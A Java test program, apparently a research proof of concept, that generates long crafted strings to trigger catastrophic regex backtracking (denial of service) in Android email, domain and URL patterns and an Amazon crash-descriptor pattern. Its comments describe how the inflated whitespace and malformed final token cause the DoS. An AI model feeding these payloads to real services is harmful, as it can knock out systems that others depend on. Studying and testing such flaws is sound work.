import java.io.*;
import java.util.regex.*;

class AndroidTester {

    public static void test_AMAZON_CRASH_DESCRIPTOR_UTIL(){

	Pattern p = ApplicationPatterns.AMAZON_CRASH_DESCRIPTOR_UTIL;	

	String crashDescriptor = generate_AMAZON_CRASH_DESCRIPTOR();

	System.out.println(crashDescriptor.length());

	Matcher m = p.matcher(crashDescriptor);

	System.out.println(m.matches());
    }

    public static void test_EMAIL_ADDRESS(){

	Pattern p = AndroidPatterns.EMAIL_ADDRESS;	

	String emailAddress = generate_EMAIL_ADDRESS();

	System.out.println(emailAddress.length());

	Matcher m = p.matcher(emailAddress);

	System.out.println(m.matches());
    }

    public static void test_DOMAIN_NAME(){

	Pattern p = AndroidPatterns.DOMAIN_NAME;	

	String hostName = generate_HOST_NAME();

	System.out.println(hostName.length());

	Matcher m = p.matcher(hostName);

	System.out.println(m.matches());
    }

    public static void test_WEB_URL(){

	Pattern p = AndroidPatterns.WEB_URL;	

	String hostName = generate_HOST_NAME();

	System.out.println(hostName.length());

	Matcher m = p.matcher(hostName);

	System.out.println(m.matches());
    }

    public static String generate_AMAZON_CRASH_DESCRIPTOR(){

	StringBuilder res = new StringBuilder();

	int N = 70000;

	StringBuilder sb;

	sb = new StringBuilder();

	sb.append("#");

	sb.append("1");

	sb.append(" ");

	sb.append("pc");

	sb.append(" ");

	sb.append("0");

	sb.append(" ");

	sb.append("\n");

	// Inflated part of the string that causes DoS.
	// Matcher doesn't know if these spaces should be 
	// parsed as \\s+ or as ([^\\+^\\r^\\n])+
	for(int i = 0; i < N; i++){
	    sb.append(" ");
	}
	
	// Incorrect last token that causes the matcher to
	// backtrack.
	sb.append("\n");

	//	sb.append("\n");
	//sb.append("b");

	return sb.toString();
	/*
	// Construct username.
	sb = new StringBuilder();
	for(int i = 0; i < 256; i++){
	    sb.append("a");
	}
	sb.append("@");

	res.append(sb);

	// Construct first domain.
	sb = new StringBuilder();
	for(int i = 0; i < 64; i++){
	    sb.append("b");
	}
	
	res.append(sb);

	// Construct N-1 correct domains.
	for(int i = 0; i < N - 1; i++){
	    sb = new StringBuilder();
	    sb.append(".");
	    sb.append("c");
	    for(int j = 0; j < 25; j++){
		sb.append("d");
	    }
	    res.append(sb);
	}

	// Construct incorrect last domain.
	sb = new StringBuilder();
	//sb.append(".");
	sb.append("e");
	for(int j = 0; j < 25; j++){
		sb.append("f");
	}
	res.append(sb);


	return res.toString();
	*/
    }

    public static String generate_EMAIL_ADDRESS(){

	StringBuilder res = new StringBuilder();

	int N = 1500;

	StringBuilder sb;

	// Construct username.
	sb = new StringBuilder();
	for(int i = 0; i < 256; i++){
	    sb.append("a");
	}
	sb.append("@");

	res.append(sb);

	// Construct first domain.
	sb = new StringBuilder();
	for(int i = 0; i < 64; i++){
	    sb.append("b");
	}
	
	res.append(sb);

	// Construct N-1 correct domains.
	for(int i = 0; i < N - 1; i++){
	    sb = new StringBuilder();
	    sb.append(".");
	    sb.append("c");
	    for(int j = 0; j < 25; j++){
		sb.append("d");
	    }
	    res.append(sb);
	}

	// Construct incorrect last domain.
	sb = new StringBuilder();
	//sb.append(".");
	sb.append("e");
	for(int j = 0; j < 25; j++){
		sb.append("f");
	}
	res.append(sb);

	return res.toString();
    }

    public static String generate_HOST_NAME(){

	StringBuilder res = new StringBuilder();

	int N = 600;

	StringBuilder sb;
	// Correct constructions of IRI.
	for(int k = 0; k < N - 1; k++) {
	    
	    sb = new StringBuilder();	

	    sb.append("a");

	    for(int i = 0; i < 61; i++) {
		sb.append("b");
	    }
	
	    sb.append("c");

	    sb.append(".");
	    
	    res.append(sb);
	}

	// Incorrect construction of the last IRI.
	sb = new StringBuilder();	

	sb.append("a");

	for(int i = 0; i < 61; i++) {
	    sb.append("b");
	}
	
	sb.append("c");

	//sb.append(".");
	    
	// GLTD
	sb.append("e");
	sb.append("f");

	res.append(sb);

	return res.toString();
    }

    public static void main(String[] args) {

	//test_DOMAIN_NAME();
	//test_WEB_URL();
	//test_EMAIL_ADDRESS();
	test_AMAZON_CRASH_DESCRIPTOR_UTIL();
    }
}
